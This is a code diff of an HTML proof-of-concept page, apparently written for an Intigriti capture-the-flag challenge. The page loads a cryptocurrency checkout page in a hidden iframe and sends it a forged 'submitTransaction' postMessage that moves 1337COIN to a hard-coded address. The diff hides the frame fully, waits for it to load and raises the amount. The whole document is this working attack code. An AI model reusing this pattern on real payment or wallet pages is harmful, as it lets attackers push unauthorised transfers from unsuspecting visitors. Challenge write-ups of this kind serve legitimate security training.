@@ -1,27 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Intigriti CTF PoC</title>
-</head>
 <body>
 
-<iframe
-    id="checkout"
-    src="https://app.intigriti.com/checkout.html?currency=1337COIN&price=1"
-    style="width:1px;height:1px;border:0;"
-></iframe>
-
 <script>
-setTimeout(() => {
-    document.getElementById('checkout').contentWindow.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-            currency: '1337COIN',
-            amount: 1337,
-            toAddress: '174094f246eb6712e885d470519c0ad4d4'
-        }
-    }, '*');
-}, 3000);
+const iframe = document.createElement('iframe');
+iframe.src = 'https://app.intigriti.com/checkout.html?currency=1337COIN&price=1';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+
+iframe.onload = () => {
+    setTimeout(() => {
+        iframe.contentWindow.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+                currency: '1337COIN',
+                amount: 13371337,
+                toAddress: '174094f246eb6712e885d470519c0ad4d4'
+            }
+        }, '*');
+    }, 2000);
+};
 </script>
 
 </body>
